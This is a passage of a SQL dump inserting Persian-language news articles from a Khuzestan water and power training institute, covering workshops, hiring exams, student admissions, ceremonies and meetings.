				<img alt="" src="wp-content/uploads/news-images/image_197.jpeg" /></td>
		</tr>
	</tbody>
</table>
<p style="text-align: center;">
	<br />
	&nbsp;</p>
', '60234Main.jpg', 385, '1403/3/2', '3:21:45 PM', 1403, 'خرداد', 3, '2');
INSERT INTO kw_news (id, group_id, sender_id, subject, summary, content, image_url, hits, news_date, news_time, year, month, num_month, day) VALUES (60235, 1, 'e7b6bb6e-4088-45d8-9725-d2c15ddd7cbb', 'برگزاری کارگاه اهمیت بررسی خوردگی در تأسیسات سد و شبکه', '<p dir="RTL" style="text-align: justify;">
	کارگاه اهمیت بررسی خوردگی در تأسیسات سد و شبکه در روزهای سه شنبه و چهارشنبه مورخ 8 و 9 خرداد ماه از ساعت 9 الی 15 در محل سالن جلسات دفتر ریاست مجتمع عالی آموزشی و پژوهشی صنعت آب و برق خوزستان برگزار گردید.</p>
<p>
	&nbsp;</p>
', '<p dir="RTL" style="text-align: justify;">
	کارگاه اهمیت بررسی خوردگی در تأسیسات سد و شبکه در روزهای سه شنبه و چهارشنبه مورخ 8 و 9 خرداد ماه از ساعت 9 الی 15 در محل سالن جلسات دفتر ریاست مجتمع عالی آموزشی و پژوهشی صنعت آب و برق خوزستان برگزار گردید.</p>
<p dir="RTL" style="text-align: justify;">
	در این کارگاه دو روزه که استقبال و رضایتمندی فراگیران را در پی داشت پس از قرائت قرآن و پخش سرود ملی، به بیان اصول و مبانی خوردگی در فلزات، انواع خوردگی و واکنش های آن، خوردگی در محیط های مختلف و روش های جلوگیری از آن پرداخته شد. همچنین جناب آقای دکتر علی حیدری مقدم با توضیح و تشریح اقدامات لازم و اصولی جهت نگهداری و بازدارندگی تجهیزات از خوردگی، مشکلات و مسائل شرکت ها در حوزه موضوع بحث را به صورت موردی بررسی نمودند و به پرسش های حضار پاسخ دادند.</p>
<p dir="RTL" style="text-align: justify;">
	&nbsp;</p>
<table align="center" border="0" cellpadding="0" cellspacing="0" style="width: 905px">
	<tbody>
		<tr>
			<td style="width: 450px;">
				<img alt="" src="wp-content/uploads/news-images/image_198.jpeg" /></td>
			<td>
				&nbsp;</td>
			<td style="width: 450px;">
				<img alt="" src="wp-content/uploads/news-images/image_199.jpeg" /></td>
		</tr>
		<tr>
			<td style="width: 450px;">
				&nbsp;</td>
			<td>
				&nbsp;</td>
			<td style="width: 450px;">
				&nbsp;</td>
		</tr>
		<tr>
			<td style="width: 450px;">
				<img alt="" src="wp-content/uploads/news-images/image_200.jpeg" /></td>
			<td>
				&nbsp;</td>
			<td style="width: 450px;">
				<img alt="" src="wp-content/uploads/news-images/image_201.jpeg" /></td>
		</tr>
	</tbody>
</table>
<p>
	&nbsp;</p>
', '60235Mainpic.jpg', 553, '1403/3/9', '5:46:23 PM', 1403, 'خرداد', 3, '9');
INSERT INTO kw_news (id, group_id, sender_id, subject, summary, content, image_url, hits, news_date, news_time, year, month, num_month, day) VALUES (60236, 1, 'e7b6bb6e-4088-45d8-9725-d2c15ddd7cbb', 'برگزاری آزمون استخدامی', '<p dir="RTL" style="text-align: justify;">
	شرکت های پیمانکاری طرف پیمان شرکت توزیع نیروی برق اهواز به منظور تأمين نيروي انساني مورد نياز خود از بین افراد واجد شرایط دعوت به همکاری می نماید<span dir="LTR">.</span></p>
<p>
	&nbsp;</p>
', '<p dir="RTL" style="text-align: justify;">
	به اطلاع ميرساند شرکت های پیمانکاری طرف پیمان شرکت توزیع نیروی برق اهواز، به منظور تأمين نيروي انساني مورد نياز، تعداد ۱۵نفر از آقايان واجد شرايط (مطابق با مفاد آگهی پیوست) را از طريق آزمون توانمنديهاي تخصصي (كتبي) و آزمون دانش مهارت (مصاحبه) به ترتیب از بالاترین نمره در قالب قرار داد نیروی حجمی جذب می نماید.</p>
<p dir="RTL" style="text-align: justify;">
	در صورت بروز هرگونه مشكل و ابهام با شماره تلفن 33347248-061 مجتمع عالي آموزشي و پژوهشي صنعت آب و برق خوزستان به عنوان مجري آزمون در وقت اداري تماس حاصل نمایید.</p>
<p dir="RTL" style="text-align: center;">
	<span style="font-size:20px;"><a href="https://estekhdam.kwphc.ir/azmoon140301" target="_blank"><span style="color:#b22222;">لینک ثبت نام</span></a></span></p>
<p style="text-align: center;">
	<img alt="" src="wp-content/uploads/news-images/image_202.jpeg" style="width: 700px; height: 982px;" /></p>
', '60236estekhdami.jpg', 8199, '1403/4/3', '10:07:22 AM', 1403, 'تیر', 4, '3');
INSERT INTO kw_news (id, group_id, sender_id, subject, summary, content, image_url, hits, news_date, news_time, year, month, num_month, day) VALUES (60237, 1, 'e7b6bb6e-4088-45d8-9725-d2c15ddd7cbb', 'برگزاری آزمون استخدامی', '<p style="text-align: justify;">
	شرکت دزیاران کارون و موسسه خدمات حفاظتی و مراقبتی حافظین امنیت پادنا، طرف قرارداد شرکت سهامی برق منطقه ای خوزستان به منظور تأمين نيروي انساني مورد نياز خود از بین افراد واجد شرایط دعوت به همکاری می نماید</p>
', '<p dir="RTL" style="text-align: justify;">
	به اطلاع مي رساند شرکت دزیاران کارون و موسسه خدمات حفاظتی و مراقبتی حافظین امنیت پادنا، طرف قرارداد شرکت سهامی برق منطقه ای خوزستان، به منظور تأمين نيروي انساني مورد نياز، تعداد 251 نفر از آقايان واجد شرايط جهت اپراتور پست برق و تعدا 189 نفر به منظور نگهبان (مطابق با مفاد آگهی پیوست) را از طريق آزمون توانمنديهاي تخصصي (كتبي) و آزمون دانش مهارت (مصاحبه) به ترتیب از بالاترین نمره در قالب قرار داد نیروی حجمی جذب می نماید.</p>
<p dir="RTL" style="text-align: justify;">
	در صورت بروز هرگونه مشكل و ابهام با شماره تلفن 33347248-061 مجتمع عالي آموزشي و پژوهشي صنعت آب و برق خوزستان به عنوان مجري آزمون در وقت اداري تماس حاصل نمایید.</p>
<p dir="RTL" style="text-align: center;">
	<strong><span style="color:#ee82ee;"><span style="font-size:14px;">جهت مشاهده آخرین تغییرات محل رشته شغلی و تعداد نفرات موردنیاز ، آگهی آزمون را مطالعه نمایید.</span></span></strong></p>
<p dir="RTL" style="text-align: center;">
	<strong><a href="https://kwphc.ir/Azmoon/AzmoonAdv/Azmoon140305.pdf" target="_blank"><span style="color:#800080;"><span style="font-size:20px;">دریافت آگهی</span></span></a></strong></p>
<p dir="RTL" style="text-align: center;">
	<a href="https://estekhdam.kwphc.ir/azmoon140302" target="_blank"><span style="color:#008080;"><strong><span style="font-size:20px;">لینک ثبت نام</span></strong></span></a></p>
<p style="text-align: center;">
	<img alt="" src="wp-content/uploads/news-images/image_203.jpeg" style="height: 800px; width: 570px;" /></p>
', '60237AzmoonPic.jpg', 17438, '1403/4/9', '9:58:03 AM', 1403, 'تیر', 4, '9');
INSERT INTO kw_news (id, group_id, sender_id, subject, summary, content, image_url, hits, news_date, news_time, year, month, num_month, day) VALUES (60238, 1, 'e7b6bb6e-4088-45d8-9725-d2c15ddd7cbb', 'آزمون استخدامی شرکت کشت و صنعت حکیم فارابی', '<p>
	شرکت کشت و صنعت حکیم فارابی به منظور تأمين نيروي انساني مورد نياز خود از بین افراد واجد شرایط دعوت به همکاری می نماید.</p>
', '<p dir="RTL" style="text-align: justify;">
	به اطلاع مي رساند شرکت کشت و صنعت حکیم فارابی به منظور تأمين نيروي انساني مورد نياز خود تعدادي از آقايان واجد شرايط را از ميان داوطلبان بومي و از طريق برگزاري آزمون توانمنديهاي عمومي و تخصصي (كتبي) و آزمون دانش مهارت (مصاحبه) و طي فرايند گزينش و به ترتيب از بالاترين نمره با شرايط ذيل و در قالب قرارداد تامين نيروي انساني جذب و بکارگيري مي نمايند.</p>
<p dir="RTL" style="text-align: justify;">
	در صورت بروز هرگونه مشكل و ابهام با شماره تلفن 33347248-061 مجتمع عالي آموزشي و پژوهشي صنعت آب و برق خوزستان به عنوان مجري آزمون در وقت اداري تماس حاصل نمایید.</p>
<p dir="RTL" style="text-align: center;">
	<a href="https://kwphc.ir/Azmoon/AzmoonAdv/Azmoon14030518.pdf" target="_blank"><span style="color:#4b0082;"><span style="font-size:20px;">دریافت آگهی</span></span></a></p>
<p dir="RTL" style="text-align: center;">
	<a href="https://estekhdam.kwphc.ir" target="_blank"><span style="color:#800080;"><span style="font-size:20px;">لینک ثبت نام</span></span></a></p>
', '60238ForNews.jpg', 6174, '1403/4/31', '10:02:35 AM', 1403, 'تیر', 4, '31');
INSERT INTO kw_news (id, group_id, sender_id, subject, summary, content, image_url, hits, news_date, news_time, year, month, num_month, day) VALUES (60239, 1, 'e7b6bb6e-4088-45d8-9725-d2c15ddd7cbb', 'معرفی مدیر و اعضای‌ شورای راهبردی مرکز رشد شهدای صنعت آب ‌و‌ برق خوزستان', '<p dir="RTL" style="text-align: justify;">
	طی مراسمی با حضور دکتر هودگر رئیس مجتمع عالی آموزشی و پژوهشی صنعت آب &zwnj;و برق خوزستان ، دکتر عرب زاده معاونت آموزشی و پژوهشی مجتمع، آقای مهندس محمد لیموئی به عنوان مدیر مرکز رشد شهدای صنعت آب و برق خوزستان معرفی شدند.</p>
<p>
	&nbsp;</p>
', '<p dir="RTL" style="text-align: justify;">
	طی مراسمی با حضور دکتر هودگر رئیس مجتمع عالی آموزشی و پژوهشی صنعت آب &zwnj;و برق خوزستان، دکتر عرب زاده معاونت آموزشی و پژوهشی مجتمع، آقای مهندس محمد لیموئی به عنوان مدیر مرکز رشد شهدای صنعت آب و برق خوزستان معرفی شدند. در این مراسم دکتر هودگر&nbsp; با اشاره به مسئولیت و اهداف مهم مرکز رشد، مدیر&nbsp; مرکز رشد و اعضای شورای راهبردی را معرفی نمودند.</p>
<p dir="RTL" style="text-align: justify;">
	دکتر هودگر&nbsp; با توجه به شعار سال به بیان برنامه&zwnj;های حوزه معاونت آموزشی و پژوهشی مجتمع در حوزه فناوری پرداختند. ایشان ابراز امیدواری کردند که با همکاری های صورت گرفته با پارک پژوهشگاه نیرو و سازمان بسیج علمی و پژوهشی خوزستان، مرکز رشد شهدای صنعت آب و برق خوزستان از سال گذشته در عرصه کارآفرینی، نوآوری و اجرای استارت تاپ موفق بوده است .</p>
<p dir="RTL" style="text-align: justify;">
	لازم به توضیح است که در این مراسم اعضای شورای راهبردی مرکز رشد،حکم مدیر مرکز رشد با پیشنهاد ریاست مجتمع ابلاغ شد.</p>
<ul>
	<li dir="RTL" style="text-align: justify;">
		دکتر مهدی هودگر ریاست شورای راهبردی</li>
	<li dir="RTL" style="text-align: justify;">
		دکتر اسماعیل عرب زاده نایب رئیس شواری راهبردی</li>
	<li dir="RTL" style="text-align: justify;">
		دکتر طالب زاده عضو شواری راهبردی</li>
	<li dir="RTL" style="text-align: justify;">
		خانم دکتر الهام ساکی مالحی عضو شواری راهبردی</li>
	<li dir="RTL" style="text-align: justify;">
		خانم مهندس صدری صیفی عضو شورای راهبردی</li>
	<li dir="RTL" style="text-align: justify;">
		مهندس محمد لیموئی دبیر شورای راهبردی</li>
</ul>
<p dir="RTL" style="text-align: center;">
	<img alt="" src="wp-content/uploads/news-images/image_204.jpeg" style="height: 400px; width: 600px;" /></p>
<p dir="RTL" style="text-align: center;">
	<img alt="" src="wp-content/uploads/news-images/image_205.jpeg" style="height: 419px; width: 600px;" /></p>
<p>
	&nbsp;</p>
', '60239Main.jpg', 4427, '1403/6/11', '10:48:01 AM', 1403, 'شهریور', 6, '11');
INSERT INTO kw_news (id, group_id, sender_id, subject, summary, content, image_url, hits, news_date, news_time, year, month, num_month, day) VALUES (60240, 1, 'e7b6bb6e-4088-45d8-9725-d2c15ddd7cbb', 'پذیرش دانشجو بدون کنکور در مقاطع کاردانی و کارشناسی ناپیوسته علمی کاربردی', '<p style="text-align: justify;">
	مجتمع عالی آموزشی و پژوهشی صنعت آب و برق خوزستان همانند سنوات گذشته در راستای رسالت خود مبنی بر مهارت افزایی و پرورش تکنسین و کارشناس متخصص، جهت نیمسال مهرماه ۱۴۰۳ در دو مقطع کاردانی و کارشناسی ناپیوسته اقدام به پذیرش دانشجو (بدون کنکور) می نماید.</p>', '<p style="text-align: justify;">
	پذیرش دانشجوی علمی کاربردی جهت مهرماه ۱۴۰۳ در مقاطع کاردانی و کارشناسی به زودی آغاز می گردد.<br />
	مجتمع عالی آموزشی و پژوهشی صنعت آب و برق خوزستان همانند سنوات گذشته در راستای رسالت خود مبنی بر مهارت افزایی و پرورش تکنسین و کارشناس متخصص، جهت نیمسال مهرماه ۱۴۰۳ در دو مقطع کاردانی و کارشناسی در رشته های مختلف اقدام به پذیرش دانشجو (بدون کنکور) می نماید.<br />
	🔥 اضافه شدن سه رشته جدید و کاربردی:<br />
	⬅️ مهندسی تجهیزات پزشکی<br />
	⬅️ مدیریت امداد و سوانح طبیعی<br />
	⬅️ مترجمی زبان انگلیسی<br />
	<br />
	⏱ زمان ثبت نام:<br />
	- کاردانی: ۱۹ لغایت ۲۴ شهریور<br />
	- کارشناسی: ۲۱ لغایت ۲۶ شهریور<br />
	<br />
	📌 نحوه ثبت نام:<br />
	- مراجعه به سایت www.sanjesh.org<br />
	- به صورت حضوری در محل مرکز آب و برق<br />
	<br />
	📝 اطلاعات بیشتر:<br />
	📞 ۰۶۱-۳۳۳۴۰۰۷۰</p>
<p style="text-align: center;">
	<img alt="" src="wp-content/uploads/news-images/image_206.jpeg" style="height: 876px; width: 700px;" /></p>', '60240Mainphoto.jpg', 1588, '1403/6/15', '5:15:08 PM', 1403, 'شهریور', 6, '15');
INSERT INTO kw_news (id, group_id, sender_id, subject, summary, content, image_url, hits, news_date, news_time, year, month, num_month, day) VALUES (60241, 1, 'e7b6bb6e-4088-45d8-9725-d2c15ddd7cbb', 'برگزاری اردوی راهیان پیشرفت', '<p style="text-align: justify;">
	اردوی راهیان پیشرفت با حضور دانشجویان و مسئولان مجتمع عالی آموزشی و پژوهشی صنعت آب و برق خوزستان از روند پروژه فاضلاب اهواز برگزار شد.</p>
', '<p style="text-align: justify;">
	به گزارش روابط عمومی مجتمع عالی، دکتر مهدی هودگر صبح دوشنبه 26 شهریور 1403 در حاشیه برپایی اردوی راهیان پیشرفت در قرارگاه خاتم&zwnj;الانبیا اهواز اظهار داشت: این اردو در راستای شناخت دانشجویان با دستاوردهای انقلاب و پیروفرمایشات مقام معظم رهبری در خصوص اردوهای راهیان پیشرفت که یکی از رسالت&zwnj;های مهم اجتماعی ما و دست&zwnj;اندرکاران حوزه ی علمی و دانشگاهی&nbsp; جهاد تبیین است انجام شده و این اردوها تداوم خواهد داشت.<br />
	وی افزود: برای عمران و آبادانی استان خوزستان، اقدامات ارزشمندی به ویژه در حوزه آبرسانی؛ نیروگاهی و رفع مشکلات و معضلات فاضلاب&nbsp; انجام گردیده که تبیین این دستاوردها و آشنایی مردم و بالاخص دانشجویان با این خدمات، لازم و ضروری است.<br />
	در این بازدید یک روزه که ۴۰ نفر از دانشجویان مستعد از رشته های مهندسی عمران- فاضلاب ؛ایمنی و حفاظت کاری و مهندسی HSE بهمراه معاونت آموزشی و پژوهشی مجتمع (دکتر عرب زاده) و متولی امور فرهنگی (حاج آقا قدوسی) حضور داشتند از روند پروژه فاضلاب و اهداف این پروژه بازدید به عمل آورند و مجریان طرح نیز در ارتباط با آخرین وضعیت پروژه و پیشرفت فیزیکی توضیحات لازم را به صورت مبسوط ارائه و تشریح نمودند.<br />
	امید است دانشجویان از فرصت های پیش آمده بهره و ثمره لازم را برده باشند و بعنوان متخصصین آینده کشور نقش خود را ایفا نمایند.<br />
	هدف اصلی از اردوی راهیان پیشرفت، تبیین و بیان دستاوردهای انقلاب اسلامی ایران در عرصه&zwnj;های مختلف علمی است که باتوجه به پیشرفت کشور در عرصه علمی، لازم است که این دستاوردها در قالب اردوی راهیان&zwnj; پیشرفت بیان و دانشجویان و متخصصین بعنوان راویان پیشرفت موضوعات را تبیین و نشر نمایند.<br />
	در پایان نیز به رسم یادبود، هدایایی از طرف قرارگاه سازندگی خاتم الانبیا به دانشجویان اهدا گردید.</p>
<table align="center" border="0" cellpadding="0" cellspacing="0" style="width: 1005px">
	<tbody>
		<tr>
			<td style="width: 500px;">
				<img alt="" src="wp-content/uploads/news-images/image_207.jpeg" /></td>
			<td style="width: 5px;">
				&nbsp;</td>
			<td style="width: 500px;">
				<img alt="" src="wp-content/uploads/news-images/image_208.jpeg" /></td>
		</tr>
	</tbody>
</table>
<p>
	&nbsp;</p>
', '60241MainPic.jpg', 388, '1403/6/28', '9:03:19 AM', 1403, 'شهریور', 6, '28');
INSERT INTO kw_news (id, group_id, sender_id, subject, summary, content, image_url, hits, news_date, news_time, year, month, num_month, day) VALUES (60242, 1, 'e7b6bb6e-4088-45d8-9725-d2c15ddd7cbb', 'حضور بسیجیان مجتمع عالی آموزشی پژوهشی صنعت آب و برق خوزستان در مراسم غبار روبی گلزار شهدا', '<p style="text-align: justify;">
	<span dir="RTL">به مناسبت فرا رسیدن هفته دفاع مقدس با هدف تجدید میثاق با شهدای انقلاب و هشت سال دفاع مقدس مراسم غبار روبی و عطر افشانی مزار شهدا با حضور بسیجیان مجتمع عالی آموزشی و پژوهشی صنعت آب و برق خوزستان در گلزار شهدا برگزار شد.</span></p>
', '<p dir="RTL" style="text-align: justify;">
	به گزارش روابط عمومی مجتمع عالی آموزشی و پژوهشی صنعت آب و برق خوزستان به مناسبت فرا رسیدن هفته دفاع مقدس با هدف تجدید میثاق با شهدای انقلاب و هشت سال دفاع مقدس مراسم غبار روبی و عطر افشانی مزار شهدا با حضور بسیجیان مجتمع عالی آموزشی و پژوهشی صنعت آب و برق خوزستان در گلزار شهدا برگزار شد.</p>
<p dir="RTL" style="text-align: justify;">
	دکتر مهدی هودگر ریاست مجتمع عالی در این آیین با بیان اینکه شرکت کنندگان در این مراسم با غبار روبی و عطرافشانی مزار شهداء و با قرائت فاتحه ضمن ادای احترام به روح بلند شهدا، بار دیگر با آرمان های امام راحل و شهدای انقلاب اسلامی تجدید میثاق کردندو نیز ضمن بزرگداشت مقام شهدا و به مناسبت هفته دفاع مقدس، اظهار کرد: این هفته یادآور فداکاری&zwnj;ها و خدمت&zwnj;گذاری شهیدان و جانبازان و جان برکفان است، باشد که همه خدمتگزاران و همکاران&nbsp; آن فداکاری&zwnj;ها را سرلوحه کار خود قرار دهند.</p>
<p dir="RTL" style="text-align: justify;">
	وی همچنین افزود:دولت مردان در نظام جمهوری اسلامی ایران با تکیه بر آرمان های امام و شهدا لحظه ای از خدمت رسانی به مردم کوتاهی نخواهند کرد و امید است همکاران ما در مجتمع عالی آموزشی و پژوهشی صنعت آب و برق خوزستان نیز همواره در راه خدمتگذاری به خانواده صنعت آب و برق و در راستای ماموریت ها و رسالت خویش موفق و توفیق روز افزون داشته باشند.</p>
<table align="center" border="0" cellpadding="0" cellspacing="0" style="width: 910px">
	<tbody>
		<tr>
			<td style="width: 300px;">
				<img alt="" src="wp-content/uploads/news-images/image_209.jpeg" /></td>
			<td style="width: 5px;">
				&nbsp;</td>
			<td style="width: 300px;">
				<img alt="" src="wp-content/uploads/news-images/image_210.jpeg" /></td>
			<td style="width: 5px;">
				&nbsp;</td>
			<td style="width: 300px;">
				<img alt="" src="wp-content/uploads/news-images/image_211.jpeg" /></td>
		</tr>
		<tr>
			<td style="width: 300px;">
				&nbsp;</td>
			<td style="width: 5px;">
				&nbsp;</td>
			<td style="width: 300px;">
				&nbsp;</td>
			<td style="width: 5px;">
				&nbsp;</td>
			<td style="width: 300px;">
				&nbsp;</td>
		</tr>
		<tr>
			<td style="width: 300px;">
				<img alt="" src="wp-content/uploads/news-images/image_212.jpeg" /></td>
			<td style="width: 5px;">
				&nbsp;</td>
			<td style="width: 300px;">
				<img alt="" src="wp-content/uploads/news-images/image_213.jpeg" /></td>
			<td style="width: 5px;">
				&nbsp;</td>
			<td style="width: 300px;">
				<img alt="" src="wp-content/uploads/news-images/image_214.jpeg" /></td>
		</tr>
	</tbody>
</table>
<p>
	&nbsp;</p>
', '60242Main.jpg', 340, '1403/7/6', '4:38:30 PM', 1403, 'مهر', 7, '6');
INSERT INTO kw_news (id, group_id, sender_id, subject, summary, content, image_url, hits, news_date, news_time, year, month, num_month, day) VALUES (60243, 1, 'e7b6bb6e-4088-45d8-9725-d2c15ddd7cbb', 'بررسی نظامنامه صلاحیت حرفه‌ای نیروی انسانی صنعت آب و برق', '<p dir="RTL" style="text-align: justify;">
	جلسه&zwnj;ی بررسی نظامنامه صلاحیت حرفه&zwnj;ای نیروی انسانی صنعت آب و برق از سوی دفترآموزش، تحقیقات و نوآوری و با حضور نمایندگان شرکت&zwnj;های مادرتخصصی، پژوهشگاه نیرو، آموزشکده فنی خوزستان و دانشگاه شهید بهشتی صبح امروز (مورخ ۹ مهرماه ۱۴۰۳) در محل حوزه ستادی وزارت نیرو برگزار شد.</p>
<p>
	&nbsp;</p>
', '<p dir="RTL" style="text-align: justify;">
	جلسه&zwnj;ی بررسی نظامنامه صلاحیت حرفه&zwnj;ای نیروی انسانی صنعت آب و برق از سوی دفترآموزش، تحقیقات و نوآوری و با حضور نمایندگان شرکت&zwnj;های مادرتخصصی، پژوهشگاه نیرو، آموزشکده فنی خوزستان و دانشگاه شهید بهشتی صبح امروز (مورخ ۹ مهرماه ۱۴۰۳) در محل حوزه ستادی وزارت نیرو برگزار شد.</p>
<p dir="RTL" style="text-align: justify;">
	در این نشست، نکته نظرات اعضای کارگروه در خصوص نظامنامه پیشنهادی دفتر آموزش، تحقیقات و نوآوری وزارت نیرو مطرح و مورد بحث و تبادل نظر قرار گرفت و در نهایت مقرر شد به منظور&nbsp;&nbsp; تصویب و ابلاغ نظامنامه فوق، آخرین اصلاحات در اسرع وقت به این دفتر ارائه شود.</p>
<p dir="RTL" style="text-align: center;">
	<img alt="" src="wp-content/uploads/news-images/image_215.jpeg" style="height: 700px; width: 700px;" /></p>
', '60243Main.jpg', 773, '1403/7/10', '10:53:52 AM', 1403, 'مهر', 7, '10');
INSERT INTO kw_news (id, group_id, sender_id, subject, summary, content, image_url, hits, news_date, news_time, year, month, num_month, day) VALUES (60245, 1, 'fbd7d553-8a7c-4de4-b9b3-fa012cc9fbcf', 'برگزاری مراسم عزاداری شهادت حضرت زهرا سلام‌الله‌علیها', '<p>
	مراسم عزاداری ایام فاطمیه به مدت 3 روز در مجتمع عالی آموزشی و پژوهشی صنعت آب و برق خوزستان برگزار می شود.</p>', '<p>
	به گزارش روابط عمومی مجتمع عالی آموزشی و پژوهشی صنعت آب و برق خوزستان، مراسم عزاداری ایام فاطمیه&nbsp; از روز شنبه 26&nbsp; آبان&zwnj;ماه به مدت 3 روز در محل نمازخانه مجتمع بعد از نماز ظهر و عصر برگزار خواهد شد.</p>
<p>
	&nbsp;</p>
<p>
	<img alt="" src="wp-content/uploads/news-images/image_216.jpeg" /></p>', '60244AZA.jpg', 169, '1403/8/23', '3:57:54 PM', 1403, 'آبان', 8, '23');
INSERT INTO kw_news (id, group_id, sender_id, subject, summary, content, image_url, hits, news_date, news_time, year, month, num_month, day) VALUES (60246, 1, 'fbd7d553-8a7c-4de4-b9b3-fa012cc9fbcf', 'بازدید مسئول مرکز مدیریت راهبردی افتا خوزستان از مجتمع آموزشی آب و برق خوزستان', '<p>
	حسینی فر، مسئول مرکز مدیریت راهبردی افتا در استان خوزستان از مجتمع آموزشی آب و برق خوزستان بازدید کرد، در جریان این بازدید که با حضور رئیس مجتمع عالی آموزشی و پژوهشی صنعت آب و برق خوزستان و مشاور حقوقی این مجتمع انجام شد، فرصت های توسعه همکاری ها و ظرفیت های هر دو نهاد مورد بحث و تبادل نظر قرار گرفت.</p>
', '<p>
	حسینی فر، مسئول مرکز مدیریت راهبردی افتا در استان خوزستان از مجتمع آموزشی آب و برق خوزستان بازدید کرد، در جریان این بازدید که با حضور رئیس مجتمع عالی آموزشی و پژوهشی صنعت آب و برق خوزستان و مشاور حقوقی این مجتمع انجام شد، فرصت های توسعه همکاری ها و ظرفیت های هر دو نهاد مورد بحث و تبادل نظر قرار گرفت.</p>
<p>
	&nbsp;</p>
<p>
	همچنین راهکارهای افزایش تعاملات بین مجتمع آب و برق خوزستان و مدیریت راهبردی افتا استان خوزستان و نحوه فرهنگ سازی امنیت سایبری و آموزش های مورد نیاز متخصصین بومی استان نیز از جمله موضوعات این جلسه بود.</p>
<p>
	&nbsp;</p>
<p>
	&nbsp;</p>
', '60246Untitled.jpg', 325, '1403/8/26', '11:28:12 AM', 1403, 'آبان', 8, '26');
INSERT INTO kw_news (id, group_id, sender_id, subject, summary, content, image_url, hits, news_date, news_time, year, month, num_month, day) VALUES (60247, 1, 'fbd7d553-8a7c-4de4-b9b3-fa012cc9fbcf', 'برگزاری موفق آزمون صلاحیت حرفه‌ای نیروهای پیمانکار در شرکت توزیع نیروی برق خوزستان', '<p dir="RTL">
	آزمون صلاحیت حرفه&zwnj;ای برای تبدیل وضعیت 365 نفر از نیروهای پیمانکار شاغل در شرکت توزیع نیروی برق خوزستان با حضور نمایندگان دستگاه متقاضی و به صورت هماهنگ در سطح کشور برگزار شد. این آزمون از ساعت 10:00 صبح آغاز و در ساعت 11:45 به پایان رسید<span dir="LTR">.</span></p>
<p>
	&nbsp;</p>
', '<p dir="RTL">
	به گزارش روابط عمومی مجتمع عالی آموزشی و پژوهشی صنعت آب و برق خوزستان در روز جمعه مورخ 25 آبان ماه ، آزمون صلاحیت حرفه&zwnj;ای جهت تبدیل وضعیت نیروهای پیمانکار شاغل در شرکت توزیع نیروی برق خوزستان برگزار شد<span dir="LTR">. </span>این آزمون با حضور 365 نفر از واجدین شرایط، در محل سالن آزمون اداره کل فنی حرفه&zwnj;ای خوزستان برگزار گردید<span dir="LTR">.</span></p>
<p dir="RTL">
	آزمون مذکور طبق ساعت از پیش تعیین شده به صورت هماهنگ در کل کشور آغاز شد و از ساعت 10:00 صبح شروع و تا ساعت 11:45 ادامه یافت. مجری برگزاری این آزمون، اداره صلاحیت حرفه&zwnj;ای مجتمع عالی آموزشی و پژوهشی صنعت آب و برق خوزستان بود<span dir="LTR">.</span></p>
<p dir="RTL">
	همچنین، نمایندگان دستگاه متقاضی (توزیع برق خوزستان) به عنوان ناظر آزمون در محل برگزاری حاضر شدند و پس از اتمام آزمون، مراتب رضایتمندی دستگاه متقاضی از اجرای آزمون اعلام گردید. این اقدام گامی مثبت در راستای ارتقاء کیفیت خدمات و تبدیل وضعیت نیروهای پیمانکار به شمار می&zwnj;آید<span dir="LTR">.</span></p>
<p>
	&nbsp;</p>
', '60247azmoon.jpg', 287, '1403/8/27', '10:54:41 AM', 1403, 'آبان', 8, '27');
INSERT INTO kw_news (id, group_id, sender_id, subject, summary, content, image_url, hits, news_date, news_time, year, month, num_month, day) VALUES (60248, 1, 'fbd7d553-8a7c-4de4-b9b3-fa012cc9fbcf', 'حضور پر رنگ کارکنان بسیجی موسسه عالی آموزشی و پژوهشی صنعت آب و برق خوزستان در رزمایش بزرگ الی بیت المقدس ۱۵', '<p>
	این رزمایش بزرگ با حضور ۲۵۰ گردان بسیج خواهران و برادران در راستای منویات رهبر معظم انقلاب و با هدف حفظ اقتدار نظام، تقویت بنیه دفاعی کشور و همچنین بالا بردن سطح آمادگی و توانایی رزمی نیروهای بسیج انجام شد .</p>
', '<p>
	&nbsp;این رزمایش بزرگ با حضور ۲۵۰ گردان بسیج خواهران و برادران در راستای منویات رهبر معظم انقلاب و با هدف حفظ اقتدار نظام، تقویت بنیه دفاعی کشور و همچنین بالا بردن سطح آمادگی و توانایی رزمی نیروهای بسیج انجام شد .<br />
	<br />
	&nbsp;به گزارش روابط عمومی مجتمع آموزشی صنعت آب و برق خوزستان، دومین روز از رزمایش ۶۰ هزار نفری الی بیت المقدس با نام سردار محمدرضا زاهدی شهید سپاه قدس، صبح جمعه با حضور سردار حسین سلامی فرمانده کل سپاه پاسداران، جمعی از فرماندهان نیروهای مسلح و مسئولان استان خوزستان و گردان&zwnj;های بسیج سراسر استان برگزار شد، که اعضای پایگاه مقاومت بسیج موسسه عالی آموزشی و پژوهشی صنعت آب و برق خوزستان در این رزمایش حضور فعال داشتند.</p>
', '60248razmayesh1.jpg', 217, '1403/9/4', '12:38:00 AM', 1403, 'آذر', 9, '4');
INSERT INTO kw_news (id, group_id, sender_id, subject, summary, content, image_url, hits, news_date, news_time, year, month, num_month, day) VALUES (60249, 1, 'fbd7d553-8a7c-4de4-b9b3-fa012cc9fbcf', 'با هدف  آسیب شناسی و احصاء چالش‌های اجرای دوره‌های آموزشی  آموزشی سال ١۴٠٣ برگزار شد', '<p>
	&nbsp;به گزارش روابط عمومی مجتمع عالی آموزشی و پژوهشی صنعت آب و برق خوزستان، جلسه هم افزایی و بررسی تقویم آموزشی با محوریت گزارش عملکرد میزان تحقق تقویم سال ١۴٠٣ و آسیب شناسی آن با حضور رییس گروه آموزش، نماینده مدیریت ایمنی و سازمان آب وبرق خوزستان، مدیران آموزش شرکت&zwnj;&zwnj;های طرف قرارداد سازمان آب و برق خوزستان آب و برق خوزستان برگزار شد.</p>
', '<p>
	&nbsp;به گزارش روابط عمومی مجتمع عالی آموزشی و پژوهشی صنعت آب و برق خوزستان، جلسه هم افزایی و بررسی تقویم آموزشی با محوریت گزارش عملکرد میزان تحقق تقویم سال ١۴٠٣ و آسیب شناسی آن با حضور رییس گروه آموزش، نماینده مدیریت ایمنی و سازمان آب وبرق خوزستان، مدیران آموزش شرکت&zwnj;&zwnj;های طرف قرارداد سازمان آب و برق خوزستان آب و برق خوزستان برگزار شد.<br />
	<br />
